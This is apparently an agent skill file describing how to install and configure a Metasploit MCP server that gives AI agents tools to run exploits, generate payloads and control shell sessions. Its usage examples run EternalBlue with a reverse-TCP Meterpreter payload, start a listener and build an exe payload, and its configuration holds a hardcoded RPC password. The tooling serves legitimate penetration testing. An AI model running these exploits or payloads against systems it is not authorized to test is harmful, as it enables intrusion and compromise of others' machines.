---
name: metasploit-mcp
description: >-
  Metasploit MCP server — bridges AI agents (Hermes, Claude, etc.) to
  Metasploit Framework via the Model Context Protocol. 12 tools for
  exploitation, payload generation, session management, and automation.
platforms: [linux]
category: security
triggers:
  - "install metasploit mcp"
  - "set up metasploit mcp"
  - "metasploitmcp"
  - "msf mcp"
  - "metasploit framework mcp"
---

# Metasploit MCP Server

Provides a bridge between LLMs and the **Metasploit Framework** via Model Context Protocol (MCP). Enables AI assistants to dynamically access and control Metasploit functionality through standardized tools.

## Architecture

```
AI Agent (Hermes/Claude/etc)
        │  stdio MCP
        ▼
MetasploitMCP.py  ←── msfrpcd (RPC daemon)
        │                  │
        ▼                  ▼
    MCP Tools        Metasploit Framework
    (12 tools)       (exploits, payloads, sessions)
```

## Installation

### Prerequisites
- **Metasploit Framework** (already installed on Kali: `msfconsole`, `msfrpcd`)
- **Python 3.10+**
- **Git**

### Step-by-Step

```bash
# 1. Clone the repo
cd ~
git clone --depth 1 https://github.com/GH05TCREW/MetasploitMCP.git

# 2. Create venv & install deps
cd ~/MetasploitMCP
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
# Requirements: fastapi, uvicorn, pymetasploit3, mcp, fastmcp

# 3. Start the Metasploit RPC daemon
msfrpcd -P <password> -S -a 127.0.0.1 -p 55553 -f
# -P password  : RPC auth password
# -S           : NO SSL (false)
# -a 127.0.0.1 : bind address
# -p 55553     : port
# -f           : foreground mode (for background, use terminal background=true)

# 4. Verify msfrpcd is listening
ss -tlnp | grep 55553

# 5. Start the MCP server (stdio mode for Hermes integration)
MSF_PASSWORD=<password> MSF_SERVER=127.0.0.1 MSF_PORT=55553 MSF_SSL=false \
  ./venv/bin/python MetasploitMCP.py --transport stdio

# Or HTTP/SSE mode for other clients:
MSF_PASSWORD=<password> MSF_SERVER=127.0.0.1 MSF_PORT=55553 MSF_SSL=false \
  ./venv/bin/python MetasploitMCP.py --transport http --host 127.0.0.1 --port 8085
# SSE endpoint: http://127.0.0.1:8085/sse
# Health check: http://127.0.0.1:8085/healthz
```

## Hermes Configuration

Add to `~/.hermes/config.yaml` under `mcp_servers`:

```yaml
mcp_servers:
  metasploit:
    command: /home/kali/MetasploitMCP/venv/bin/python
    args:
      - /home/kali/MetasploitMCP/MetasploitMCP.py
      - --transport
      - stdio
    env:
      MSF_PASSWORD: "vulcan123"
      MSF_SERVER: "127.0.0.1"
      MSF_PORT: "55553"
      MSF_SSL: "false"
    enabled: true
```

Or via CLI:

```bash
hermes mcp add metasploit \
  --command /home/kali/MetasploitMCP/venv/bin/python \
  --args /home/kali/MetasploitMCP/MetasploitMCP.py \
  --args --transport \
  --args stdio \
  --env MSF_PASSWORD=vulcan123 \
  --env MSF_SERVER=127.0.0.1 \
  --env MSF_PORT=55553 \
  --env MSF_SSL=false \
  --connect-timeout 30
```

Verify: `hermes mcp test metasploit`

## Available Tools (12)

### Module Information
| Tool | Description |
|------|-------------|
| `list_exploits` | Search/list available Metasploit exploit modules (optional filter) |
| `list_payloads` | Search/list available payloads with platform/arch filtering |

### Exploitation
| Tool | Description |
|------|-------------|
| `run_exploit` | Configure & execute an exploit against a target (optional check first) |
| `run_auxiliary_module` | Run any auxiliary module with custom options |
| `run_post_module` | Execute post-exploitation modules against existing sessions |

### Payload Generation
| Tool | Description |
|------|-------------|
| `generate_payload` | Generate payload files using Metasploit RPC (saves locally) |

### Session Management
| Tool | Description |
|------|-------------|
| `list_active_sessions` | Show current sessions with details |
| `send_session_command` | Run commands in active shell/Meterpreter session |
| `terminate_session` | Forcefully end a session |

### Handler Management
| Tool | Description |
|------|-------------|
| `list_listeners` | Show all active handlers and background jobs |
| `start_listener` | Create a new multi/handler to receive connections |
| `stop_job` | Terminate any running job or handler |

## Usage Examples

```bash
# 1. List exploits
list_exploits("ms17_010")

# 2. Run exploit
run_exploit(
  module="exploit/windows/smb/ms17_010_eternalblue",
  options={"RHOSTS": "192.168.1.100"},
  payload="windows/x64/meterpreter/reverse_tcp",
  payload_options={"LHOST": "192.168.1.10", "LPORT": 4444}
)

# 3. List sessions
list_active_sessions()

# 4. Run post-exploit
run_post_module("windows/gather/enum_logged_on_users", session_id=1)

# 5. Send commands
send_session_command(session_id=1, command="whoami")
send_session_command(session_id=1, command="sysinfo")

# 6. Start listener
start_listener(payload="windows/meterpreter/reverse_tcp", lhost="192.168.1.10", lport=4444)

# 7. Generate payload
generate_payload(payload="windows/meterpreter/reverse_tcp", format="exe",
                 options={"LHOST": "192.168.1.10", "LPORT": 4444})
```

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `MSF_PASSWORD` | `yourpassword` | RPC auth password (MUST match msfrpcd -P) |
| `MSF_SERVER` | `127.0.0.1` | msfrpcd host |
| `MSF_PORT` | `55553` | msfrpcd port |
| `MSF_SSL` | `false` | Whether msfrpcd uses SSL |
| `PAYLOAD_SAVE_DIR` | `~/payloads` | Where generated payloads are saved |
| `LOG_LEVEL` | `info` | Logging verbosity |

## Troubleshooting

### "Failed to connect: Connection closed" (Hermes MCP add)
- Ensure `msfrpcd` is running before testing
- Check env vars match msfrpcd settings exactly
- Test stdio directly: `echo '{"jsonrpc":"2.0","id":1,"method":"initialize"}' | MSF_PASSWORD=... python MetasploitMCP.py --transport stdio`
- Log messages go to stderr, JSON-RPC to stdout — they don't interfere

### msfrpcd fails to start
```bash
# Check if another instance is running
pkill -f msfrpcd
sleep 2
msfrpcd -P vulcan123 -S -a 127.0.0.1 -p 55553 -f &
sleep 3
ss -tlnp | grep 55553
```

### "No SSL" despite -S flag
The `-S` flag means **NO SSL** in modern msfrpcd. This is expected behavior — set `MSF_SSL=false` to match.

### Port already in use
```bash
# Find what's using the port
ss -tlnp | grep 55553
# Kill it
fuser -k 55553/tcp
```

## Pitfalls
- The `-S` flag in msfrpcd means **NO SSL** (counterintuitive — `-S` disables SSL in newer Metasploit)
- Always start `msfrpcd` **before** starting the MCP server
- Generated payloads save to `$PAYLOAD_SAVE_DIR` (default `~/payloads/`)
- Rate-limit to 200ms between requests when using in production assessments
- Use `--transport stdio` for Hermes integration; `--transport http` for Claude Desktop/web clients
